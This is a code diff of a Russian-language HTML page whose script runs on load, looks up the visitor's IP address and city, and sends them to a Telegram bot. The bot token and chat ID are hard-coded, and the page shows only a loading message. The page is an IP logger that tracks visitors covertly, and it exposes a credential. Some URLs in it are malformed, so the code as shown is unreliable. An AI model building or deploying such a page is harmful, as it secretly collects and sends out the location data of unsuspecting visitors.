@@ -2,41 +2,37 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v6.0)</h1>
-
+    <h1 id="status">Загрузка... (v11.0)</h1>
     <script>
-        async function start() {
-            // Твои рабочие данные
+        async function run() {
+            // Твой рабочий токен и ID
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "8426763446";
             const status = document.getElementById('status');
 
             try {
-                // 1. Получаем IP
+                // 1. Получаем IP (ОБЯЗАТЕЛЬНО /json/ в конце!)
                 const res = await fetch('https://ipapi.co');
                 const data = await res.json();
                 
-                // 2. Формируем текст
-                const msg = `🚀 Новый переход!\nIP: ${data.ip}\nГород: ${data.city}`;
+                const text = encodeURIComponent(`🚀 ЛОГ!\nIP: ${data.ip}\nГород: ${data.city}`);
 
-                // 3. Отправляем в Telegram
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+                // 2. Отправляем в Telegram
+                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text}`;
                 
-                const response = await fetch(url);
-                const result = await response.json();
+                const tgRes = await fetch(url);
+                const result = await tgRes.json();
 
                 if (result.ok) {
-                    status.innerText = "ГОТОВО! Проверяй Telegram.";
+                    status.innerText = "ГОТОВО! Сообщение в телеге.";
                 } else {
                     status.innerText = "ОШИБКА БОТА: " + result.description;
                 }
             } catch (e) {
-                status.innerText = "ОШИБКА СЕТИ: " + e;
+                status.innerText = "ОШИБКА КОДА: " + e;
             }
         }
-
-        // Запуск
-        start();
+        run();
     </script>
 </body>
 </html>
